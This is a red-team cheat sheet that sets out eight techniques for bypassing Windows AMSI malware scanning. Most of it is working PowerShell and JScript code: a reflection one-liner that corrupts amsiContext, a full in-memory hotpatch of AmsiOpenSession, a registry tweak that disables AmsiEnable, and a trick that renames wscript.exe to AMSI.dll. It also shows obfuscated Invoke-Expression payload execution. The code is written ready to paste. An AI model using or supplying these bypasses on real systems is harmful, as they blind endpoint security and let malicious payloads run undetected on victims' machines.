### AMSI Bypass Techniques for Red Teaming (Authorized Engagements Only)

#### Technique 1: String Concatenation/Obfuscation
1. In PowerShell: Replace literal strings with concatenated versions, e.g., `'Am' + 'siUtils'` instead of `'AmsiUtils'`.
2. Execute payload: `Invoke-Expression ('Am' + 'siUtils')` or integrate into full script.

#### Technique 2: Encoding/Obfuscation
1. In PowerShell: Encode payload as Base64, e.g., `$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('malicious code'))`.
2. Decode and execute: `Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))`.

#### Technique 3: Chunked/Fragmented Execution
1. In PowerShell: Split payload into fragments, e.g., `$part1 = 'malicious'; $part2 = ' code'`.
2. Combine and execute: `Invoke-Expression ($part1 + $part2)`.

#### Technique 4: Use Native APIs or Reflection
1. In PowerShell: Use reflection for payloads, e.g., `[Reflection.Assembly]::LoadWithPartialName('System')`.

#### Technique 5: Reflection Bypass in PowerShell (Corrupt amsiContext)
1. Run full script:
   ```powershell
   $a = [Ref].Assembly.GetTypes()
   Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
   $d = $c.GetFields('NonPublic,Static')
   Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
   $g = $f.GetValue($null)
   [IntPtr]$ptr = $g
   [Int32[]]$buf = @(0)
   [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
   ```
2. Or one-liner:
   ```powershell
   $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
   ```
3. Execute payload, e.g., `'amsiutils'`.

#### Technique 6: Hotpatching AmsiOpenSession in PowerShell
1. Define helper functions:
   ```powershell
   function LookupFunc {
       Param ($moduleName, $functionName)
       $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
       $tmp = @()
       $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
       return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
   }

   function getDelegateType {
       Param (
           [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
           [Parameter(Position = 1)] [Type] $delType = [Void]
       )
       $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
       $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
       $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
       return $type.CreateType()
   }
   ```
2. Resolve and patch:
   ```powershell
   [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
   $oldProtectionBuffer = 0
   $vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
   $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
   $buf = [Byte[]] (0x48, 0x31, 0xC0)
   [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
   $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
   ```
3. Execute payload, e.g., `'amsiutils'`.

#### Technique 7: Registry Key Manipulation in JScript
1. Prepend to JScript payload:
   ```jsx
   var sh = new ActiveXObject('WScript.Shell');
   var key = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
   try{
       var AmsiEnable = sh.RegRead(key);
       if(AmsiEnable!=0){
           throw new Error(1, '');
       }
   }catch(e){
       sh.RegWrite(key, 0, "REG_DWORD");
       sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
       sh.RegWrite(key, 1, "REG_DWORD");
       WScript.Quit(1);
   }
   ```
2. Run via `wscript.exe` or `cscript.exe`, e.g., `wscript.exe script.js`.

#### Technique 8: Self-Named Executable as AMSI.DLL in JScript
1. Prepend to JScript payload:
   ```jsx
   var filesys= new ActiveXObject("Scripting.FileSystemObject");
   var sh = new ActiveXObject('WScript.Shell');
   try
   {
       if(filesys.FileExists("C:\\\\Windows\\\\Tasks\\\\AMSI.dll")==0)
       {
           throw new Error(1, '');
       }
   }
   catch(e)
   {
       filesys.CopyFile("C:\\\\Windows\\\\System32\\\\wscript.exe", "C:\\\\Windows\\\\Tasks\\\\AMSI.dll");
       sh.Exec("C:\\\\Windows\\\\Tasks\\\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
       WScript.Quit(1);
   }
   ```
2. Run via `wscript.exe`, e.g., `wscript.exe script.js`.
